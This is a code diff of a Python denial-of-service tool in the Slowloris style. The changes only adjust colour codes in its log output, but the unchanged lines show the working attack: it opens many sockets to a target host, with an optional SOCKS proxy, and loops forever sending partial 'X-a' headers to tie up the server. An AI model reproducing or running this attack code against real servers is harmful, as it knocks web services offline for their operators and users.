@@ -44,9 +44,9 @@ if args.useproxy:
         logging.error("Socks Proxy Library Not Available!")
 
 if args.verbose:
-    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="\033[94m%d-%m-%Y %H:%M:%S\033[0m", level=logging.DEBUG)
+    logging.basicConfig(format="\033[94m[%(asctime)s] %(message)s\033", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
 else:
-    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="\033[94m%d-%m-%Y %H:%M:%S\033[0m", level=logging.INFO)
+    logging.basicConfig(format="\033[94m[%(asctime)s] %(message)s\033", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)
 
 list_of_sockets = []
 user_agents = [
@@ -170,19 +170,19 @@ def init_socket(ip):
 def main():
     ip = args.host
     socket_count = args.sockets
-    logging.info("\033[91m[*] Attacking %s With %s Sockets \033[0m", ip, socket_count)
+    logging.info("\033[91m [*] Attacking %s With %s Sockets \033[0m", ip, socket_count)
 
-    logging.info("\033[92[*] Creating Sockets . . . \033[0m")
+    logging.info("\033[92m [*] Creating Sockets . . . \033[0m")
     for _ in range(socket_count):
         try:
-            logging.debug("[92m[*] Creating Socket nr %s \033[0m", _)
+            logging.debug("\033[92m [*] Creating Socket nr %s \033[0m", _)
             s = init_socket(ip)
         except socket.error:
             break
         list_of_sockets.append(s)
 
     while True:
-        logging.info("\033[96m[*] Packet Sent ✓ AsparTim : %s \033[0m", len(list_of_sockets))
+        logging.info("\033[96m [*] Packet Sent ✓ AsparTim : %s \033[0m", len(list_of_sockets))
         for s in list(list_of_sockets):
             try:
                 s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
